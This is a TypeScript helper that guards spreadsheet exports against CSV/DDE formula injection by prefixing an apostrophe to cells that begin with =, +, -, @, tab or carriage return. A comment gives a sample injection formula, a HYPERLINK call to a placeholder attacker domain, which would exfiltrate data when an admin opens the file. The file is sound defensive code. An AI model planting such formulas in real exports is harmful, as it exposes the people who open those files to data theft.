// Excel CSV-injection / DDE-injection guard.
//
// Cells whose first character is one of these trigger formula evaluation
// in Excel / Google Sheets / Numbers:
//
//   =   → formula
//   +   → formula (legacy SYLK / Lotus)
//   -   → formula (negation → formula)
//   @   → formula (Lotus / SYLK)
//   \t  → can be interpreted as cell separator in some importers
//   \r  → ditto
//
// A participant supplying a name like `=HYPERLINK("https://evil.invalid",…)`
// would exfiltrate on the admin's workstation when they open the XLSX.
//
// The OWASP-recommended mitigation is to prefix a single-quote (`'`) —
// Excel displays the leading apostrophe only when editing the cell, the
// rendered value is the rest of the string as literal text.

const DANGEROUS_LEAD = /^[=+\-@\t\r]/;

export function safeCellText(value: unknown): string {
  if (value == null) return "";
  const s = String(value);
  if (DANGEROUS_LEAD.test(s)) return `'${s}`;
  return s;
}
